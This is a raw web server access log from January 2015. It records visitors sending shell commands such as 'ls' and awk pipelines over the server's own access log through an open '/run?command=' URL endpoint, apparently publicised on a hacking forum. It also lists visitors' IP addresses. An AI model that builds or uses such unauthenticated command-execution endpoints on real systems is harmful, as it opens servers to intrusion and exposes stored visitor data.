78.172.44.50 - - [19/Jan/2015:13:46:46 +0000] "GET /run?command=awk%20%27{print%20$1}%27%20python.access.log%20|sort%20-u%20|wc%20-l HTTP/1.1" 200 2 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
78.172.44.50 - - [19/Jan/2015:13:46:47 +0000] "GET /run?command=awk%20%27{print%20$1}%27%20python.access.log%20|sort%20-u%20|wc%20-l HTTP/1.1" 200 2 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
78.172.44.50 - - [19/Jan/2015:13:46:47 +0000] "GET /run?command=awk%20%27{print%20$1}%27%20python.access.log%20|sort%20-u%20|wc%20-l HTTP/1.1" 200 2 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
78.172.44.50 - - [19/Jan/2015:13:46:57 +0000] "GET /run?command=awk%20%27{print%20$1}%27%20/var/log/nginx/python.access.log%20|sort%20-u%20|wc%20-l HTTP/1.1" 200 4 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
89.236.108.3 - - [19/Jan/2015:13:47:17 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "http://www.reddit.com/r/hacking/comments/2sv2jh/this_is_running_on_my_server_do_whatever_you_like/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
89.236.108.3 - - [19/Jan/2015:13:47:17 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
78.172.44.50 - - [19/Jan/2015:13:47:53 +0000] "GET /run?command=awk%20%27{print%20$1}%27%20/var/log/nginx/python.access.log%20|sort%20-u%20 HTTP/1.1" 200 675 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
150.70.97.125 - - [19/Jan/2015:13:48:13 +0000] "GET /run?command=awk%20%27%7Bprint%20$1%7D%27%20/var/log/nginx/python.access.log%20%7Csort%20-u%20%7Cwc%20-l HTTP/1.1" 200 4 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
150.70.97.97 - - [19/Jan/2015:13:48:26 +0000] "GET /run?command=awk%20%27%7Bprint%20$1%7D%27%20python.access.log%20%7Csort%20-u%20%7Cwc%20-l HTTP/1.1" 200 2 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
169.235.76.162 - - [19/Jan/2015:13:48:37 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 209 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
169.235.76.162 - - [19/Jan/2015:13:48:44 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B440"
150.70.97.118 - - [19/Jan/2015:13:49:09 +0000] "GET /run?command=awk%20%27%7Bprint%20$1%7D%27%20/var/log/nginx/python.access.log%20%7Csort%20-u%20 HTTP/1.1" 200 1563 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
24.153.60.238 - - [19/Jan/2015:13:49:13 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 209 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
78.172.44.50 - - [19/Jan/2015:13:49:25 +0000] "GET /run?command=awk%20%27{print%20$1}%27%20/var/log/nginx/python.access.log%20|sort%20-u%20 HTTP/1.1" 200 693 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
